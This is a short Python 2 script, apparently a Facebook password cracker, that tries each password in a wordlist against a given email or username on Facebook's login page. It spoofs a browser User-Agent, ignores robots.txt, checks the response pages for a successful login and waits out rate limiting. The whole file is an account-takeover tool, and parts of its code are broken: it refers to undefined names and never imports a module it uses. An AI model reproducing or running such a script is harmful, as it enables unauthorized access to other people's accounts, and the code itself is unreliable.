import mechanize, urllib2
post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
br = mechanize.Browser()
br.addheaders = [('User-Agent',headers['User-Agent'])]
br.set_handle_robots(False)
file1 = str(input('Enter wordlist path : '))
file=open(file1,'r')
email=str(input('Enter Email/Username : ').strip())
no = 0
while file:
	passw=file.readline().strip()
	no+=1
	if len(passw) < 6:
		continue
	print str(no) +" : ",passw
	response = browser.open(post_url)
	try:
		if response.code == 200:
			browser.select_form(nr=0)
			browser.form['email'] = email
			browser.form['pass'] = passw
			response = browser.submit()
			response_data = response.read()
			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
				print('Your password is : ',passw)
				break
	except:
		print('\nSleeping for time : 5 min\n')
		time.sleep(300)